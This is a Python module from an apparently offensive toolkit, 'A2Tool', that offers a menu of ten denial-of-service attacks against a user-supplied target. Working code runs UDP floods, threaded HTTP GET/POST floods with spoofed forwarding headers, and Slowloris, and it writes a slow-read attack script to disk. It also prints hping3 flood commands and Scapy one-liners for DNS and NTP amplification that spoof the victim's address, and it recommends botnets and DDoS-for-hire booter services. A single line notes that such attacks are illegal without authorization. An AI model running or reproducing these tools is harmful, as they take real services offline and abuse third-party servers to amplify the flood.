#!/usr/bin/env python3
"""
A2Tool v4.0 - DDoS / Stress Testing Tools Module (10 Tools)
Author: Ayush Rajdev & Anzar Iqbal
"""

import os, sys, subprocess, re, json, time, socket, threading, random
from datetime import datetime
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE='';RESET=''
    class Style: RESET_ALL='';BRIGHT='';DIM='';NORMAL=''

R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; B=Fore.BLUE
M=Fore.MAGENTA; C=Fore.CYAN; W=Fore.WHITE; RS=Style.RESET_ALL

def _run(cmd, shell=True, timeout=30):
    try: return subprocess.check_output(cmd, shell=shell, stderr=subprocess.STDOUT, timeout=timeout).decode('utf-8', errors='ignore')
    except: return ''

def menu():
    while True:
        print(f"\n{Y}╔══════════════════════════════════════════════════════════════╗{RS}")
        print(f"{Y}║{W}               DDoS / Stress Testing Tools                  {Y}║{RS}")
        print(f"{Y}╠══════════════════════════════════════════════════════════════╣{RS}")
        print(f"{Y}║{W} [01]{R}  SYN Flood Attack                                 {Y}║{RS}")
        print(f"{Y}║{W} [02]{R}  UDP Flood Attack                                 {Y}║{RS}")
        print(f"{Y}║{W} [03]{R}  HTTP GET/POST Flood                              {Y}║{RS}")
        print(f"{Y}║{W} [04]{R}  Slowloris (Slow HTTP Attack)                     {Y}║{RS}")
        print(f"{Y}║{W} [05]{R}  ICMP Flood (Ping of Death)                       {Y}║{RS}")
        print(f"{Y}║{W} [06]{R}  DNS Amplification                                {Y}║{RS}")
        print(f"{Y}║{W} [07]{R}  NTP Amplification                                {Y}║{RS}")
        print(f"{Y}║{W} [08]{R}  Application Layer (HTTP/2) Attack               {Y}║{RS}")
        print(f"{Y}║{W} [09]{R}  Slow Read Attack                                 {Y}║{RS}")
        print(f"{Y}║{W} [10]{R}  Multi-Vector Attack (Combine Methods)            {Y}║{RS}")
        print(f"{Y}║{W} [0]{R}   Back to Main Menu                                 {Y}║{RS}")
        print(f"{Y}╚══════════════════════════════════════════════════════════════╝{RS}")
        ch = input(f"\n{Y}  A2Tool[DDoS] » {RS}").strip()
        if ch == '0': break
        elif ch == '1': syn_flood()
        elif ch == '2': udp_flood()
        elif ch == '3': http_flood()
        elif ch == '4': slowloris()
        elif ch == '5': icmp_flood()
        elif ch == '6': dns_amplification()
        elif ch == '7': ntp_amplification()
        elif ch == '8': http2_attack()
        elif ch == '9': slow_read()
        elif ch == '10': multi_vector()
        else: print(f"{R}[!] Invalid option{RS}")

def syn_flood():
    """Tool 1: SYN Flood Attack"""
    target = input(f"  {W}[?] Target IP: {RS}").strip()
    port = int(input(f"  {W}[?] Target port: {RS}").strip() or '80')
    duration = int(input(f"  {W}[?] Duration (seconds): {RS}").strip() or '30')
    
    print(f"\n{R}[!] SYN Flood Attack on {target}:{port} for {duration}s{RS}")
    print(f"{Y}[!] Requires hping3 or raw socket permissions{RS}")
    
    print(f"\n{W}Using hping3:{RS}")
    print(f"  hping3 -S -p {port} --flood {target}")
    
    print(f"\n{W}Using Python (requires scapy):{RS}")
    python_script = f"""from scapy.all import *
target = "{target}"
port = {port}
send(IP(dst=target)/TCP(dport=port, flags='S'), loop=1, verbose=0)"""
    print(f"  {Y}{python_script}{RS}")
    
    start_now = input(f"\n{Y}[?] Start attack? (y/n): {RS}").strip().lower()
    if start_now == 'y':
        os.system(f'hping3 -S -p {port} --flood {target} -d {duration}')
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def udp_flood():
    """Tool 2: UDP Flood Attack"""
    target = input(f"  {W}[?] Target IP: {RS}").strip()
    port = int(input(f"  {W}[?] Target port (0=random): {RS}").strip() or '0')
    duration = int(input(f"  {W}[?] Duration (seconds): {RS}").strip() or '30')
    
    print(f"\n{R}[!] UDP Flood Attack on {target} for {duration}s{RS}")
    print(f"{Y}[!] Using hping3:{RS}")
    print(f"  hping3 -2 -p {port} --flood {target}" if port else f"  hping3 -2 --flood --rand-source {target}")
    
    # Python implementation
    print(f"\n{W}Python UDP Flood included in multi-vector{RS}")
    
    start_now = input(f"\n{Y}[?] Start attack? (y/n): {RS}").strip().lower()
    if start_now == 'y':
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end = time.time() + duration
            sent = 0
            while time.time() < end:
                data = random._urandom(1024)
                target_port = port or random.randint(1, 65535)
                s.sendto(data, (target, target_port))
                sent += 1
                if sent % 1000 == 0:
                    print(f"  {C}Sent {sent} packets...{RS}", end='\r')
            s.close()
            print(f"\n{G}[+] Sent {sent} UDP packets{RS}")
        except Exception as e:
            print(f"{R}[-] Error: {e}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def http_flood():
    """Tool 3: HTTP GET/POST Flood"""
    url = input(f"  {W}[?] Target URL: {RS}").strip()
    threads = int(input(f"  {W}[?] Number of threads: {RS}").strip() or '50')
    duration = int(input(f"  {W}[?] Duration (seconds): {RS}").strip() or '30')
    
    print(f"\n{R}[!] HTTP Flood on {url} with {threads} threads for {duration}s{RS}")
    
    attack_type = input(f"  {W}[?] Attack type (get/post/both): {RS}").strip().lower() or 'get'
    
    stop_event = threading.Event()
    sent_count = [0]
    
    def attack_worker():
        try:
            import requests
            while not stop_event.is_set():
                try:
                    if attack_type in ['get', 'both']:
                        requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0', 'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'})
                        sent_count[0] += 1
                    if attack_type in ['post', 'both']:
                        requests.post(url, data={'fuzzer': 'test'}, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                        sent_count[0] += 1
                except: pass
        except: pass
    
    workers = []
    for _ in range(threads):
        t = threading.Thread(target=attack_worker)
        t.daemon = True
        t.start()
        workers.append(t)
    
    print(f"{G}[+] Attack running. Press Ctrl+C to stop.{RS}")
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Attack stopped by user{RS}")
    
    stop_event.set()
    for t in workers:
        t.join(timeout=1)
    
    print(f"\n{G}[+] Attack finished. Sent ~{sent_count[0]} requests{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def slowloris():
    """Tool 4: Slowloris Attack"""
    target = input(f"  {W}[?] Target IP/Domain: {RS}").strip()
    port = int(input(f"  {W}[?] Port (default 80): {RS}").strip() or '80')
    sockets_cnt = int(input(f"  {W}[?] Number of sockets: {RS}").strip() or '200')
    
    print(f"\n{R}[!] Slowloris Attack on {target}:{port} with {sockets_cnt} sockets{RS}")
    print(f"{Y}[!] This keeps connections open by sending partial HTTP headers{RS}")
    
    attack_code = f'''
import socket, time, sys

target = "{target}"
port = {port}
num_sockets = {sockets_cnt}

sockets = []
for i in range(num_sockets):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(b"GET / HTTP/1.1\\r\\n")
        s.send(f"Host: {{target}}\\r\\n".encode())
        s.send(b"User-Agent: Mozilla/5.0\\r\\n")
        s.send(b"Content-Length: 42\\r\\n")
        sockets.append(s)
        print(f"[+] Socket {{i}} connected")
    except Exception as e:
        print(f"[-] Socket {{i}}: {{e}}")

print(f"[+] Holding {{len(sockets)}} connections open...")
while True:
    for s in sockets:
        try:
            s.send(b"X-a: b\\r\\n")
        except:
            sockets.remove(s)
    time.sleep(10)
'''
    
    with open('slowloris.py', 'w') as f:
        f.write(attack_code)
    
    print(f"{W}Attack code saved as slowloris.py{RS}")
    print(f"{G}[+] Running: python slowloris.py{RS}")
    
    start_now = input(f"\n{Y}[?] Start attack? (y/n): {RS}").strip().lower()
    if start_now == 'y':
        exec(attack_code)
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def icmp_flood():
    """Tool 5: ICMP Flood (Ping of Death)"""
    target = input(f"  {W}[?] Target IP: {RS}").strip()
    count = input(f"  {W}[?] Count (default: 1000): {RS}").strip() or '1000'
    
    print(f"\n{R}[!] ICMP Flood on {target}{RS}")
    
    print(f"{W}Standard ping flood:{RS}")
    print(f"  ping -f -s 65507 {target}" if os.name == 'nt' else f"  ping -f -s 65507 -c {count} {target}")
    
    print(f"\n{W}Using hping3:{RS}")
    print(f"  hping3 -1 --flood {target}")
    
    print(f"\n{W}Using nping:{RS}")
    print(f"  nping --icmp -c {count} {target}")
    
    start_now = input(f"\n{Y}[?] Start ping flood? (y/n): {RS}").strip().lower()
    if start_now == 'y':
        if os.name == 'nt':
            os.system(f'ping -n {count} -l 65500 {target} -w 1')
        else:
            os.system(f'ping -f -s 65507 -c {count} {target}')
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def dns_amplification():
    """Tool 6: DNS Amplification Attack"""
    target = input(f"  {W}[?] Target IP: {RS}").strip()
    dns_server = input(f"  {W}[?] Open DNS resolver (e.g., 8.8.8.8): {RS}").strip() or '8.8.8.8'
    
    print(f"\n{R}[!] DNS Amplification Attack - Spoofing {dns_server} → {target}{RS}")
    
    print(f"{W}Using hping3:{RS}")
    print(f"  hping3 -c 10000 -d 120 -S -w 64 -p 53 --flood --rand-source {dns_server}")
    
    print(f"\n{W}Using Scapy:{RS}")
    print(f"""  send(IP(src="{target}", dst="{dns_server}")/UDP(sport=5353, dport=53)/DNS(rd=1,qd=DNSQR(qname="isc.org",qtype="ANY")), loop=1, verbose=0)""")
    
    print(f"\n{Y}[!] Amplification factor: DNS response can be ~50x request size{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def ntp_amplification():
    """Tool 7: NTP Amplification Attack"""
    target = input(f"  {W}[?] Target IP: {RS}").strip()
    
    print(f"\n{R}[!] NTP Amplification Attack{RS}")
    print(f"{Y}[!] Monlist command returns ~100x response size{RS}")
    
    print(f"\n{W}Check if NTP is vulnerable:{RS}")
    print(f"  nmap -sU -p 123 --script ntp-monlist {target}")
    
    print(f"\n{W}Using hping3:{RS}")
    print(f"  hping3 -c 10000 -d 120 -S -w 64 -p 123 --flood --rand-source {target}")
    
    print(f"\n{W}Using Scapy:{RS}")
    print(f"  send(IP(src=\"{target}\", dst=\"NTP_SERVER\")/UDP(sport=123,dport=123)/NTP(version=2,mode=7,stratum=0,refid=b'\\x00'*4), loop=1)")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def http2_attack():
    """Tool 8: Application Layer (HTTP/2) Attack"""
    target = input(f"  {W}[?] Target URL: {RS}").strip()
    print(f"\n{R}[!] HTTP/2 Rapid Reset & Stream Attacks{RS}")
    
    print(f"{W}HTTP/2 Attack Vectors:{RS}")
    print(f"  1. Rapid Reset (CVE-2023-44487) - Rapidly open and cancel streams")
    print(f"  2. Stream Multiplexing Flood - Open many simultaneous streams")
    print(f"  3. HPACK Bomb - Compress many headers into small request")
    print(f"  4. SETTINGS Frame Flood - Send many settings frames")
    print(f"  5. PING Flood - Send many PING frames")
    
    print(f"\n{W}Using h2load or h2spec:{RS}")
    print(f"  h2load -c 100 -n 10000 {target}")
    print(f"  h2spec -h {target.split('//')[-1]}")
    
    print(f"\n{W}Using rapid reset PoC:{RS}")
    print(f"  python3 -c \"import http.client, ssl; c=http.client.HTTPSConnection('{target.split('//')[-1]}', context=ssl._create_unverified_context()); c.request('GET','/'); print(c.getresponse().status)\"")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def slow_read():
    """Tool 9: Slow Read Attack"""
    target = input(f"  {W}[?] Target URL: {RS}").strip()
    print(f"\n{R}[!] Slow Read Attack (Slow HTTP Read){RS}")
    
    print(f"{W}This attack reads responses very slowly, exhausting server resources{RS}")
    
    attack_code = f'''
import socket, time, ssl

target = "{target.split('//')[-1].split('/')[0]}"
port = 443 if "https" in "{target}" else 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if port == 443:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(s, server_hostname=target)

s.connect((target, port))
s.send(b"GET / HTTP/1.1\\r\\n")
s.send(f"Host: {{target}}\\r\\n".encode())
s.send(b"User-Agent: Mozilla/5.0\\r\\n")
s.send(b"Accept: */*\\r\\n")
s.send(b"Connection: keep-alive\\r\\n\\r\\n")

# Read very slowly - 1 byte at a time
while True:
    data = s.recv(1)
    if not data:
        break
    time.sleep(30)  # 30 second delay between bytes
'''
    
    print(f"\n{W}Python script saved (slow_read.py):{RS}")
    with open('slow_read.py', 'w') as f:
        f.write(attack_code)
    print(f"{G}[+] Saved as slow_read.py{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def multi_vector():
    """Tool 10: Multi-Vector Attack"""
    target_ip = input(f"  {W}[?] Target IP: {RS}").strip()
    target_url = input(f"  {W}[?] Target URL (if different): {RS}").strip() or f'http://{target_ip}'
    
    print(f"\n{R}[!] Multi-Vector DDoS Attack{RS}")
    print(f"{W}Combining multiple attack methods for maximum impact:{RS}")
    
    print(f"\n  {W}Attack Vectors Selected:{RS}")
    print(f"  {R}[1]{RS} SYN Flood - Consumes connection table")
    print(f"  {R}[2]{RS} HTTP Flood - Consumes application resources")
    print(f"  {R}[3]{RS} UDP Flood - Consumes bandwidth")
    print(f"  {R}[4]{RS} Slowloris - Consumes connection pool")
    
    print(f"\n{W}Recommended tools for multi-vector:{RS}")
    print(f"  {W}•{RS} Low Orbit Ion Cannon (LOIC)")
    print(f"  {W}•{RS} High Orbit Ion Cannon (HOIC)")
    print(f"  {W}•{RS} DDoS-for-hire services (RDP, booter)")
    print(f"  {W}•{RS} Botnet simulation")
    
    print(f"\n{Y}[!] Launch from multiple sources for effective DDoS{RS}")
    print(f"{R}[!] DDoS attacks are illegal without authorization{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")
